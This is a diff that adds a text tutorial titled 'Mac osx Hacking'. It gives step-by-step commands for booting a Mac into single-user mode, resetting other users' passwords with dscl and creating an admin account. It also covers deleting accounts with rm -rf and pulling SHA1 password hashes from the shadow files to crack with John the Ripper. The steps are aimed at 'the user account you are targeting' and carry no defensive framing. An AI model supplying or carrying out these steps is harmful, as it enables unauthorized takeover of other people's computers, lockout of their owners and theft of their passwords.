@@ -1,0 +1,279 @@
+
+/*===============================================================================================================*/
+/*	      	     	Mac osx Hacking	 	  */
+/*===============================================================================================================*/
+
+How to crack macs by booting into single user mode
+
+This can be used to change user passwords or create new accounts
+
+/*===============================================================================================================*/
+
+1 - Shutdown the Mac by pressing the power button
+
+2 - Then press the power button again to restart the Mac
+
+3 - Straight away hold down cmd S on the keyboard
+
+4 - When a console window appears you can let go of cmd s on the keyboard
+
+/*===============================================================================================================*/
+
+You should now be in a console window and see the hash symbol #  
+
+The hash symbol indicates this is the command line prompt for the root account  
+
+This is where you will enter commands to run, after you have typed each command press return
+
+When the command has finished running you will be return to a new command line prompt,  
+indicated by the hash symbol #
+
+
+/*===============================================================================================================*/
+
+5 - Verify integrity of the filesystem  
+
+This is to make sure we can edit files on the drive
+
+Type the following command and then press return
+(This will verify integrity of the filesystem and check the file permissions)
+
+/sbin/fsck -fy
+
+
+The command may take a couple of minutes becuase it is checking the permissions on the drive
+
+/*===============================================================================================================*/
+
+6 - Mount the filesystem
+
+We have to mount the filesystem to be able to make changes to the files on the disk
+
+Type the following command and then press return
+(This will mount the filesystem like mounting a drive in the Finder)
+
+/sbin/mount -uw /  
+
+/*===============================================================================================================*/
+
+7 - Loading the dscl command line tool
+
+dscl is a command line tool to change passwords on existing accounts,  
+or create new accounts on the Mac
+
+Before we can use the dscl command line tool we have to load it
+This is becuase we havent booted into the Mac desktop and so dscl hasnt loaded yet
+
+We are going to using launchctl to load a DirectoryServices.plist file,
+which will then allow us to use the dscl command line program
+
+launchctl is a program used to launch certain processes or applications when the Mac boots up
+
+
+Type the following command and then press return
+(This allows you to use the dscl command line tool to change passwords or create new accounts)
+
+launchctl load /System/Library/LaunchDaemons/com.apple.DirectoryServices.plist  
+
+/*===============================================================================================================*/
+
+8 - Listing users accounts on the Mac
+
+Type the following command and then press return
+(This will list all the user accounts)
+
+ls /Users
+
+
+Make a note of the user account names,  
+they are needed in the next step when we will reset their passwords
+
+/*===============================================================================================================*/
+
+9 - Listing the UniqueID of accounts on the Mac
+
+Type the following command and then press return
+(This will list the UniqueID of accounts on the Mac)
+
+dscl . -list /Users UniqueID | sort -n -k2,2
+
+/*===============================================================================================================*/
+
+10 - Listing more information about an account
+
+Type the following command and then press return
+(Replacing username with the user account you are targeting)
+
+dscl localhost -read /Search/Users/username
+
+/*===============================================================================================================*/
+
+
+11 - Changing the password for an existing account
+
+Now we are going to change the password for one of the user account we found by running the command: ls /Users  
+
+
+For example:
+
+Afer running: ls /Users
+
+We see the following accounts listed  
+
+johndoe janedoe
+
+
+To reset the password for johndoe you would enter this command
+(replacing newpassword with the desired password)
+
+dscl . -passwd /Users/johndoe newpassword
+
+
+To reset the password for janedoe you would enter this command
+(replacing newpassword with the desired password)
+
+dscl . -passwd /Users/janedoe newpassword
+
+
+Now we will change the password of one of the accouts we found by running: ls /
+
+Replace username with the username of the account whose password you want to change
+
+
+Type the following command and then press return
+(replacing username with the targeted user and newpassword with the desired password)
+
+dscl . -passwd /Users/username newpassword
+
+
+After you have reset the password perform the following steps
+
+Type the following command and then press return
+(This will reboot the system)
+
+reboot
+
+After you reboot and enter the password you will get a warning that your login keychain has changed  
+
+Click create new keychain login
+
+and it will log you in
+
+
+/*===============================================================================================================*/
+
+12 - Creating a new account
+
+dscl . -create /Users/admin
+dscl . -create /Users/admin UserShell /bin/bash
+dscl . -create /Users/admin RealName “admin”
+dscl . -create /Users/admin UniqueID 502 (see notes below about this)
+dscl . -create /Users/admin PrimaryGroupID 80 
+dscl . -create /Users/admin NFSHomeDirectory /Users/admin 
+dscl . -passwd /Users/admin password
+dscl . -append /Groups/admin GroupMembership admin
+exit
+
+Create the users home directory
+
+sudo createhomedir -c -u admin
+
+
+/*===============================================================================================================*/
+
+13 - Deleting user accounts
+
+Type the following commands and then press return after each one
+
+# /sbin/fsck -fy
+# /sbin/mount -uw /  
+# launchctl load /System/Library/LaunchDaemons/com.apple.DirectoryServices.plist  
+
+# dscl . -delete /Groups/admin GroupMembership testuser
+# dscl . -delete /Users/testuser
+# cd Users
+# rm -rf testuser (warning: will delete any files in user home folder)
+# exit
+
+/*===============================================================================================================*/
+
+14 - Cracking passwords
+
+OS X password storage has the following characteristics:
+
+Password hashes are stored in the /var/db/shadow/hash/<GUID> file
+
+Each user has their own shadow file
+
+Local OS X passwords are stored as SHA1 hashes
+
+
+So, the first thing we want to do this is find out what the GUID is for the account we are targeting
+
+
+Type the following command and then press return
+(Replacing username with the user account you are targeting)
+
+# dscl localhost -read /Search/Users/username | grep GeneratedUID | cut -c15-
+
+/*===============================================================================================================*/
+
+15 - extracting the hashes
+
+Next, we want to extract the SHA1 hash from the shadow file. For this, we do the following:
+
+# cat /var/db/shadow/hash/A66BCB30-2413-422A-A574-DE03108F8AF2 | cut -c169-216
+
+Note: Replace the above GUID with the one you have extracted from the previous step.
+
+You should have been returned with a SHA1 hash that looks similar to the following:
+33BA7C74C318F5D3EF40EB25E1C42F312ACF905E20540226
+
+/*===============================================================================================================*/
+
+16 - cracking the password
+
+At this point we are ready to crack the OS X passwords. For this step we will need a patched version of the password cracking utility John The Ripper. The patch (Jumbo Patch) we require will allow us to crack salted SHA1 passwords (referred to as XSHA in John). The patch can be downloaded from the following locations:
+
+Windows
+Mac OS X
+Unix – Tutorial on how to patch
+Once we have download/patched John, the extracted hash and username should be placed in a text file. For this example I have added the username ‘bob’ and bob’s hash (that I obtained in STEP 2) into a file called sha1.txt. The file has the following format:
+
+bob:33BA7C74C318F5D3EF40EB25E1C42F312ACF905E20540226
+
+We can then use John the crack the password:
+
+# ./john sha1.txt
+
+If John is successful in recognising the hash, the following message will be displayed:
+”Loaded 1 password hash (Mac OS X 10.4+ salted SHA1 [32/64])”
+
+A successful cracking attempt will appear as follows:
+
+password (bob)
+guesses: 1 time: 0:00:00:00 100% (2) c/s: 153000 trying: password
+
+/*===============================================================================================================*/
+
+17 - Reboot
+
+Type the following command and then press return
+(This will reboot the system)
+
+# reboot
+
+/*===============================================================================================================*/
+
+18 - Login
+
+After you reboot and enter the password you will get a warning that your login keychain has changed  
+
+Click create new keychain login
+
+and it will log you in
+
+
+
+
+
